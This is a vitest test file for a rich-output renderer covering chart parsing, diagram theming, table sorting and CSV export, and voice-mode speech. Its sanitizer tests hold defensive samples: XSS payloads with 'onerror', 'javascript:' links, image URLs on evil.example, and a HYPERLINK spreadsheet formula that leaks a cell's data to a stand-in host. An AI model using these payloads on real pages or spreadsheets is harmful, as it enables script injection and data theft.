import { describe, it, expect } from "vitest";
import { chartSpeech, parseChartBlock } from "./chart-spec";
import { diagramSpeech, mathSpeech, richSpeakable, splitFences, tableSpeech } from "./rich-speech";
import { cellNumber, sortOrder, tableFilename, toCsv, toTsv } from "./RichTable";
import { withDefaults } from "./RichChart";
import { themedSource } from "./RichDiagram";

describe("chart blocks", () => {
  const pie = '{"title":{"text":"Disk use by folder"},"series":[{"type":"pie","data":[{"name":"logs","value":4},{"name":"cache","value":6}]}]}';

  it("reads the standard option as JSON", () => {
    const res = parseChartBlock(pie);
    expect(res.ok).toBe(true);
  });

  it("also reads the loose form agents write (unquoted keys, single quotes, trailing commas)", () => {
    const res = parseChartBlock("{title: {text: 'Trend'}, xAxis: {type: 'category', data: ['a','b',]}, yAxis: {}, series: [{type: 'line', data: [1,2]},],}");
    expect(res.ok).toBe(true);
    if (res.ok) expect(chartSpeech(res.option)).toBe("A line chart: Trend.");
  });

  it("reads the code-style form with no space after the colon", () => {
    const res = parseChartBlock("{xAxis:{type:'category', data:['Mon','Tue']}, yAxis:{type:'value'}, series:[{name:'t1000',type:'line',data:[3.1,2.8]}]}");
    expect(res.ok).toBe(true);
    if (res.ok) expect((res.option.series as { type: string }[])[0].type).toBe("line");
  });

  it("refuses an unreadable or seriesless block", () => {
    expect(parseChartBlock("{not json: [").ok).toBe(false);
    expect(parseChartBlock('{"title":{"text":"x"}}').ok).toBe(false);
    expect(parseChartBlock("[1,2]").ok).toBe(false);
    expect(parseChartBlock("").ok).toBe(false);
  });

  it("strips markup formatters, outside pictures and page-escaping settings", () => {
    const res = parseChartBlock(JSON.stringify({
      tooltip: { formatter: "<img src=x onerror=alert(1)>", extraCssText: "x", appendTo: "body", renderMode: "html" },
      graphic: [{ type: "image", style: { image: "https://evil.example/t.png" } }, { type: "text", style: { text: "ok" } }],
      series: [{ type: "scatter", symbol: "image://https://evil.example/p.png", label: { formatter: "{b}: {c}" }, data: [[1, 2]] }],
    }));
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    const o = res.option as Record<string, any>;
    expect(o.tooltip).toEqual({ extraCssText: "x", renderMode: "richText" });
    expect(o.graphic).toHaveLength(1);
    expect(o.series[0].symbol).toBeUndefined();
    expect(o.series[0].label.formatter).toBe("{b}: {c}");
  });

  it("speaks its kind and title", () => {
    const res = parseChartBlock(pie);
    if (res.ok) expect(chartSpeech(res.option)).toBe("A pie chart: Disk use by folder.");
    const bare = parseChartBlock('{"series":[{"type":"bar","data":[1]},{"type":"line","data":[2]}]}');
    if (bare.ok) expect(chartSpeech(bare.option)).toBe("A chart.");
  });

  it("adds hover values and a legend only when the agent didn't set them", () => {
    const res = parseChartBlock(pie);
    if (!res.ok) throw new Error("parse");
    const o = withDefaults(res.option) as Record<string, any>;
    expect(o.tooltip.trigger).toBe("item");
    expect(o.legend).toBeTruthy();
    const own = withDefaults({ ...res.option, tooltip: { show: false }, legend: { show: false } }) as Record<string, any>;
    expect(own.tooltip.show).toBe(false);
    expect(own.legend).toEqual({ show: false });
    const line = withDefaults({ xAxis: {}, yAxis: {}, series: [{ type: "line", data: [1] }] }) as Record<string, any>;
    expect(line.tooltip.trigger).toBe("axis");
    expect(line.legend).toBeUndefined();
  });
});

describe("diagram spoken lines and look", () => {
  it("names the kind and title", () => {
    expect(diagramSpeech("mermaid", "flowchart TD\n  A-->B")).toBe("A flowchart.");
    expect(diagramSpeech("mermaid", "%% note\ntimeline\n  title Release history\n  2024 : v1")).toBe("A timeline: Release history.");
    expect(diagramSpeech("mermaid", "gantt\n  title Deploy plan\n  section A")).toBe("A schedule chart: Deploy plan.");
    expect(diagramSpeech("mermaid", "pie title Pets\n  \"Dogs\" : 3")).toBe("A pie chart: Pets.");
    expect(diagramSpeech("mermaid", "---\ntitle: Deploy steps\n---\nflowchart LR\n A-->B")).toBe("A flowchart: Deploy steps.");
    expect(diagramSpeech("dot", 'digraph { label="Services"; a -> b }')).toBe("A graph diagram: Services.");
  });

  it("draws dark unless the diagram picks its own theme", () => {
    expect(themedSource("mermaid", "graph TD\nA-->B")).toMatch(/^%%\{init: \{"theme": "dark"/);
    expect(themedSource("mermaid", "%%{init: {'theme':'forest'}}%%\ngraph TD")).toBe("%%{init: {'theme':'forest'}}%%\ngraph TD");
    expect(themedSource("graphviz", "digraph G { a -> b }")).toMatch(/^digraph G \{ graph \[bgcolor="transparent"/);
  });
});

describe("table helpers", () => {
  it("reads numbers the way people write them", () => {
    expect(cellNumber("1,204")).toBe(1204);
    expect(cellNumber("$5.50")).toBe(5.5);
    expect(cellNumber("12%")).toBe(12);
    expect(cellNumber("3.2 GB")).toBe(3.2);
    expect(cellNumber("-4")).toBe(-4);
    expect(cellNumber("(7)")).toBe(-7);
    expect(cellNumber("v1.2.3")).toBeNull();
    expect(cellNumber("t1000")).toBeNull();
  });

  it("sorts numerically or by text, keeps empties last, and is stable", () => {
    const rows = [["b", "10"], ["a", "9"], ["c", ""], ["d", "100"]];
    expect(sortOrder(rows, 1, "asc")).toEqual([1, 0, 3, 2]);
    expect(sortOrder(rows, 1, "desc")).toEqual([3, 0, 1, 2]);
    expect(sortOrder(rows, 0, "asc")).toEqual([1, 0, 2, 3]);
    expect(sortOrder([["host2"], ["host10"], ["host1"]], 0, "asc")).toEqual([2, 0, 1]);
  });

  it("writes spreadsheet text, quoting where needed", () => {
    expect(toTsv(["a", "b"], [["1", "x\ty"]])).toBe("a\tb\n1\tx y");
    expect(toCsv(["name", "note"], [["a", 'say "hi", ok']])).toBe('name,note\r\na,"say ""hi"", ok"');
    expect(tableFilename(["Host name", "Disk"])).toBe("host-name.csv");
    expect(tableFilename(["", "x"])).toBe("table.csv");
  });

  it("speaks its size and headings", () => {
    expect(tableSpeech(["host", "disk"], 12)).toBe("A table of 12 rows: host, disk.");
    expect(tableSpeech(["x"], 1)).toBe("A table of 1 row: x.");
  });
});

describe("formula spoken lines", () => {
  it("reads short formulas and names long ones", () => {
    expect(mathSpeech("E = mc^2")).toBe("E equals mc squared");
    expect(mathSpeech("\\frac{a}{b}")).toBe("a over b");
    expect(mathSpeech("\\sum_{i=0}^{n} \\binom{n}{i} x^i y^{n-i} \\mathrm{d}x")).toBe("a formula");
  });
});

describe("voice mode reads wealthy text as its spoken lines", () => {
  it("replaces charts, diagrams, tables, collapsed sections and formulas", () => {
    const md = [
      "Here's the picture.",
      "",
      "```chart",
      '{"title":{"text":"Disk"},"series":[{"type":"pie","data":[1]}]}',
      "```",
      "",
      "| host | disk |",
      "| --- | --- |",
      "| a | 1 |",
      "| b | 2 |",
      "",
      "```mermaid",
      "flowchart TD",
      "A-->B",
      "```",
      "",
      "<details>",
      "<summary>Full logs</summary>",
      "",
      "lots of noisy lines",
      "",
      "</details>",
      "",
      "So $x^2$ costs $5 to $10.",
      "",
      "```bash",
      "ls",
      "```",
    ].join("\n");
    const out = richSpeakable(md);
    expect(out).toContain("A pie chart: Disk.");
    expect(out).toContain("A table of 2 rows: host, disk.");
    expect(out).toContain("A flowchart.");
    expect(out).toContain("Full logs.");
    expect(out).not.toContain("noisy");
    expect(out).toContain("So x squared costs $5 to $10.");
    expect(out).toContain("```bash\nls\n```");
  });

  it("reads a section written to start open in full", () => {
    const out = richSpeakable("<details open>\n<summary>Steps</summary>\n\nFirst do this.\n\n</details>");
    expect(out).toContain("Steps.");
    expect(out).toContain("First do this.");
  });

  it("leaves examples inside other code blocks alone", () => {
    const md = "````md\n```chart\n{}\n```\n| a | b |\n| - | - |\n````";
    const segs = splitFences(md);
    expect(segs).toHaveLength(1);
    expect(richSpeakable(md)).toBe(md);
  });
});

describe("review fixes", () => {
  const opt = (o: unknown) => {
    const res = parseChartBlock(JSON.stringify(o));
    if (!res.ok) throw new Error(res.error);
    return res.option as Record<string, any>;
  };

  it("closes every route from chart text into the page or out to the network", () => {
    const o = opt({
      title: { text: "Click", link: "javascript:alert(1)", target: "self", sublink: "https://x", subtarget: "blank" },
      graphic: [{ type: "text", style: { text: "hover" }, tooltip: { content: "<img src=x onerror=alert(1)>" } }],
      toolbox: { feature: { dataView: { lang: ["<img src=x onerror=alert(1)>"] } } },
      backgroundColor: { image: "https://evil.example/px.png", repeat: "repeat" },
      series: [{ type: "sunburst", data: [{ name: "a", value: 1, link: "javascript:x" }], itemStyle: { color: { image: "https://evil.example/a.png" } }, label: { rich: { a: { backgroundColor: { image: "https://evil.example/b.png" } } } } }],
    });
    expect(o.title).toEqual({ text: "Click" });
    expect(o.toolbox).toBeUndefined();
    expect(o.graphic[0].tooltip).toEqual({ renderMode: "richText" });
    expect(o.backgroundColor).toEqual({ repeat: "repeat" });
    expect(o.series[0].data[0].link).toBeUndefined();
    expect(JSON.stringify(o)).not.toMatch(/evil|javascript|onerror/);
  });

  it("forces canvas tooltips, even when the agent asks for HTML ones", () => {
    const o = opt({ tooltip: { renderMode: "html", trigger: "item" }, series: [{ type: "pie", data: [1], tooltip: { show: true } }] });
    expect(o.tooltip.renderMode).toBe("richText");
    expect(o.series[0].tooltip.renderMode).toBe("richText");
    const d = withDefaults(opt({ series: [{ type: "pie", data: [1] }] })) as Record<string, any>;
    expect(d.tooltip.renderMode).toBe("richText");
  });

  it("keeps ordinary labels that merely look like schemes", () => {
    const o = opt({ series: [{ type: "bar", data: [{ name: "JavaScript", value: 3 }, { name: "data: raw", value: 1 }] }] });
    expect(o.series[0].data.map((d: any) => d.name)).toEqual(["JavaScript", "data: raw"]);
  });

  it("puts the dark theme after a diagram's title header", () => {
    const src = "---\ntitle: Deploy\n---\nflowchart LR\n A-->B";
    const out = themedSource("mermaid", src);
    expect(out.startsWith("---\ntitle: Deploy\n---\n%%{init:")).toBe(true);
    expect(themedSource("mermaid", "---\nconfig:\n  theme: forest\n---\ngraph TD")).toBe("---\nconfig:\n  theme: forest\n---\ngraph TD");
  });

  it("themes the graph body, not a brace inside its name or a comment", () => {
    const out = themedSource("graphviz", '// {not this}\ndigraph "a{b" { x -> y }');
    expect(out).toContain('digraph "a{b" { graph [bgcolor="transparent"');
    expect(out).toContain("// {not this}");
  });

  it("sorts mixed size units and skips placeholders", () => {
    expect(sortOrder([["2 GB"], ["500 MB"], ["1.5 TB"]], 0, "asc")).toEqual([1, 0, 2]);
    expect(sortOrder([["999"], ["—"], ["1,204"], ["n/a"], ["5"]], 0, "asc")).toEqual([4, 0, 2, 1, 3]);
    // Units that can't be compared sort as text (still number-aware).
    expect(sortOrder([["10 s"], ["5 kg"], ["abc"]], 0, "asc")).toEqual([1, 0, 2]);
  });

  it("never hands a spreadsheet a formula", () => {
    const rows = [['=HYPERLINK("https://evil?d="&A2,"x")', "-5", "+1 more", "@sum", "plain"]];
    const csv = toCsv(["a", "b", "c", "d", "e"], rows).split("\r\n")[1];
    expect(csv).toBe(`"'=HYPERLINK(""https://evil?d=""&A2,""x"")",-5,'+1 more,'@sum,plain`);
    expect(toTsv(["a"], [["=1+1"]]).split("\n")[1]).toBe("'=1+1");
  });

  it("voice mode keeps a closed section silent even with code blocks inside", () => {
    const md = "Done.\n\n<details>\n<summary>Full log</summary>\n\nhidden prose\n\n```log\nline\n```\n\nmore hidden\n\n```chart\n{\"title\":{\"text\":\"Secret\"},\"series\":[{\"type\":\"pie\",\"data\":[1]}]}\n```\n\n</details>\n\nAfter.";
    const out = richSpeakable(md);
    expect(out).toContain("Full log.");
    expect(out).toContain("After.");
    expect(out).not.toMatch(/hidden|line|Secret/);
  });

  it("voice mode reads nested open sections inside an open one, and not inside a closed one", () => {
    const open = richSpeakable("<details open>\n<summary>A</summary>\n\nx1\n\n<details>\n<summary>B</summary>\n\nx2\n\n</details>\n\n</details>");
    expect(open).toContain("A.");
    expect(open).toContain("x1");
    expect(open).toContain("B.");
    expect(open).not.toContain("x2");
  });
});
